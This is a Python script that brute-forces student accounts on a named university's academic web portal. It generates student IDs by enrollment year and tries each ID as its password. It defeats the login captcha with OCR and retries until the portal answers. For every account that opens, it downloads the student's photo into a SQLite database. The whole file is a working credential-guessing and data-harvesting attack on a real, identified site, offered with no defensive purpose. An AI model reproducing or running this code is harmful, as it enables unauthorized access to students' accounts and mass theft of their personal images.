# !/usr/bin/env python           
# coding  : utf-8 
# Date    : 2018-04-23 18:18:00
# Author  : b4zinga
# Email   : b4zinga@outlook.com
# Function: 爆破xxx用户名密码并采集其中信息保存至sqlite3数据库. 需要安装pytesseract和PIL库识别验证码	requests库

import requests
import pytesseract
from PIL import Image
import itertools
import time
import sqlite3

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'}

def insert_into_db(db_name, table_name, id, sno, pic_file):
	conn = sqlite3.connect(db_name)
	cur = conn.cursor()
	cur.execute('create table if not exists {} (id integer primary key,sno integer, data blob)'.format(table_name))
	f = open(pic_file,'rb')
	data = f.read()
	cur.execute('insert into photo (id, sno, data) values (?, ?, ?)', (id,sno,data,))
	f.close()
	conn.commit()
	conn.close()


def get_last_record_from_db(db_name, table_name):
	conn = sqlite3.connect(db_name)
	cur = conn.cursor()
	cur.execute('create table if not exists {} (id integer primary key,sno integer, data blob)'.format(table_name))
	cur.execute('select * from {}'.format(table_name))
	record = cur.fetchall()  # 取出所有记录
	try:
		last_record = record[-1][1]
		conn.commit()
		conn.close()
		return str(last_record),len(record)
	except Exception as e:
		conn.commit()
		conn.close()
		return '-1'


def select_id_sno_from_db(db_name,table_name):
	conn = sqlite3.connect(db_name)
	cur = conn.cursor()
	cur.execute('create table if not exists {} (id integer primary key,sno integer, data blob)'.format(table_name))
	cur.execute('select * from {}'.format(table_name))
	for item in cur:
		print(str(item[0])+'\t'+str(item[1]))



def image_recognition(img):
	image = Image.open(img)
	vcode = pytesseract.image_to_string(image)
	return vcode


def login(username='', password=''):
	check_url = 'http://deanonline.stdu.edu.cn/academic/j_acegi_security_check'
	img_url = 'http://deanonline.stdu.edu.cn/academic/getCaptcha.do'
	succ_url = 'http://deanonline.stdu.edu.cn/academic/index_new.jsp'

	# while True:
	session = requests.Session()

	img_req = session.get(img_url, headers=headers)
	with open('code.jpg','wb') as file:
		file.write(img_req.content)

	identify_code = image_recognition('code.jpg')

	post_data = {
		'groupId' : '',
		'j_username' : username,
		'j_password' : password,
		'j_captcha' : identify_code,
		'button1': '',
	}

	check_req = session.post(check_url,post_data,headers=headers)
	check_result = check_req.content.decode('gbk')

	# succ_req = session.get(succ_url,headers=headers)
	# succ_html = succ_req.content.decode('gbk')
	return check_result, session


def burst(username='', password='', if_get_pic = False, wait_time=0, max_times = 10,):
	student_info_url = 'http://deanonline.stdu.edu.cn/academic/student/studentinfo/studentInfoModifyIndex.do?frombase=0&wantTag=0&groupId=&moduleId=2060'
	student_pic_url = 'http://deanonline.stdu.edu.cn/academic/manager/studentinfo/showStudentImage.jsp'
	error_count = 0
	while True:
		error_count += 1
		result, session = login(username,password)
		if error_count >= max_times:
			break
		if '您输入的验证码不正确' in result:  # 验证码不正确，重新识别
			time.sleep(wait_time)
			continue 
		elif '不存在' in result:  # 用户名不存在
			break
		elif '密码不匹配' in result:  # 传入的用户名和密码不匹配
			return False
		elif '综合教务管理系统' in result:  # 用户名密码正确
			if if_get_pic:
				temp = session.get(student_info_url,headers=headers)
				spic_req = session.get(student_pic_url,headers=headers)
				with open('student/'+username+'.jpg', 'wb') as pic:
					pic.write(spic_req.content)
			return True



def make_username(year=2014, len=1):
	usr = []
	ends = itertools.product('0123456789', repeat=4)
	for end in ends:
		n = ''
		for item in end:
			n += item 
		usr.append(str(year)+n)
	return (usr[:len])


def main_without_db():
	result = []
	for y in [2015,2016]:
		sids = make_username(y,3000)
		print('username finished !')
		for sid in sids:
			if burst(sid,sid,True,max_times=10):
				result.append(sid)
				print('[+]\t'+sid)
			else:
				print('[-]\t'+sid)
				
	with open('result.txt','w') as file:
		for r in result:
			file.write(r+'\n')

	print(result)


def main_db(db_name='', table_name=''):
	last_record,student_count = get_last_record_from_db(db_name, table_name)  # 取出最新记录
	print('already exists '+str(student_count)+ ' items')
	for y in [2014, 2015, 2016, 2017]:
		sids = make_username(y, 3000)
		print(y, ' --> username finished !')
		for sid in sids:
			if sid > last_record:  
				if burst(sid, sid, True, max_times=10):
					insert_into_db(db_name, table_name, student_count, int(sid), 'student/'+sid+'.jpg')
					student_count += 1
					print('[+]\t'+sid)
				else:
					print('[-]\t'+sid)
			else:
				print('already tested : '+sid)



if __name__ == '__main__':
	main_db('student.db', 'photo')
